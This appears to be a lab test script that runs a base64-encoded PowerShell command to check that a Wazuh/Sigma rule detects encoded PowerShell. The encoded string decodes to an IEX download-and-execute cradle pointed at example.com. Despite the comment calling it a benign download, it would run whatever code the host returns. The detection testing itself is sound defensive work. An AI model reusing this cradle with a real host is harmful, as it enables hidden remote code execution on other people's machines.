# Test script for Sigma-0001 / Wazuh rule 100011 (encoded PowerShell detection)
# Run on the Win11 endpoint (Mode A) to validate the detection pipeline end to end.
# The encoded command below simply downloads a benign string - it is a
# detection test, not a real payload.

powershell.exe -enc "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtACcAKQA="

Write-Host "Test executed. Confirm a Wazuh alert (rule 100011) appears within seconds."
Write-Host "Record detection latency in docs/phase-notes/phase6-detection-engineering.md"
